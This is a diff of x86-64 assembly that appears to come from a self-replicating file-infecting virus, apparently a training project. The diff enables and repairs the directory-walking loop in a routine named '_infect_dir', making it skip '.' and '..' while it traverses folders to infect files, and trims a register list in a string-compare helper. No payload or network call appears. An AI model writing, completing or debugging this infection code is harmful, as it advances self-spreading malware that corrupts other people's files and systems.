@@ -65,7 +65,7 @@ ret
 
 dotdir db `.`, 0x0, `..`, 0x0, 0x0
 
-_ft_strcmp: ; (string rdi, string rsi) - use rcx, rdi, rsi, rax, rdx
+_ft_strcmp: ; (string rdi, string rsi) - use rcx, rdi, rsi, rax
 	xor rcx, rcx; = 0
 	.loop_char:
 		mov al, [rdi + rcx]
@@ -154,34 +154,32 @@ _infect_dir:; (string rdi)
 		
 ; ft_strcmp with '.' and '..' to not infect_dir with them
 		push rcx
-;		lea rsi, [rel dotdir]
-;		xor rcx, rcx; = 0
-;		.loop_array_string:
-;			add rsi, rcx
-;			push rcx
-;			push rdx
-;			call _ft_strcmp
-;			pop rdx
-;			pop rcx
-;			cmp rax, 0
-;			je .next_dir
-;			xor rcx, rcx; = 0
-;			.next_string:; seek next dir
-;				inc rcx
-;				cmp byte[rsi + rcx], 0x0
-;				jnz .next_string
-;			inc rcx
-;			cmp byte[rsi + rcx], 0x0
-;			jnz .loop_array_string
+		lea rsi, [rel dotdir]
+		xor rcx, rcx; = 0
+		.loop_array_string:
+			add rsi, rcx
+			push rcx
+			call _ft_strcmp
+			pop rcx
+			cmp rax, 0
+			je .next_dir
+			xor rcx, rcx; = 0
+			.next_string:; seek next dir
+				inc rcx
+				cmp byte[rsi + rcx], 0x0
+				jnz .next_string
+			inc rcx
+			cmp byte[rsi + rcx], 0x0
+			jnz .loop_array_string
 
 		%ifdef DEBUG
 			push rdx
 			call _print; _print(rdi)
 			pop rdx
 		%endif
-		pop rcx
 
 		.next_dir:
+			pop rcx
 			mov rsi, r12
 			add rsi, rcx
 			push rdi
